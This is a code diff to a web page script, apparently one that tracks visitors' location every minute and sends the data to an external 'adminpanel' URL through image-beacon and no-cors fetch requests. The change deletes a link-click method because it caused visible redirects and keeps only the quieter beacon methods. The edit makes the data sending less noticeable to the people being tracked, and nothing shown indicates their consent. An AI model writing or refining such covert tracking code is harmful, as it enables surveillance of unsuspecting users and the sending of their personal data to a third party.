@@ -85,32 +85,22 @@
                         // GitHub Pages admin panel URL
                         const adminUrl = "https://ashutosh231.github.io/adminpanel/";
                         
-                        // Use multiple methods to try to send the data
+                        // Use only non-redirecting methods to send the data
                         
                         // Method 1: Image request (most compatible)
                         const img = new Image();
                         img.src = adminUrl + "?track=" + 
                             encodeURIComponent(JSON.stringify(data));
                         
-                        // Method 2: Fetch API (modern browsers)
+                        // Method 2: Fetch API with no-cors mode (won't redirect)
                         try {
                             fetch(adminUrl + "?track=" + encodeURIComponent(JSON.stringify(data)), 
-                                { mode: 'no-cors' }); // no-cors mode for cross-origin requests
+                                { mode: 'no-cors' });
                         } catch(e) {
-                            console.log("Fetch failed, using fallback method");
+                            console.log("Fetch failed");
                         }
                         
-                        // Method 3: Create a link and click it (backup)
-                        try {
-                            const link = document.createElement('a');
-                            link.href = adminUrl + "?track=" + encodeURIComponent(JSON.stringify(data));
-                            link.style.display = 'none';
-                            document.body.appendChild(link);
-                            link.click();
-                            setTimeout(() => document.body.removeChild(link), 100);
-                        } catch(e) {
-                            console.log("Link method failed");
-                        }
+                        // REMOVED: Method 3 that was causing redirects
                         
                         // Continue tracking every minute
                         setTimeout(trackLocation, 60000);
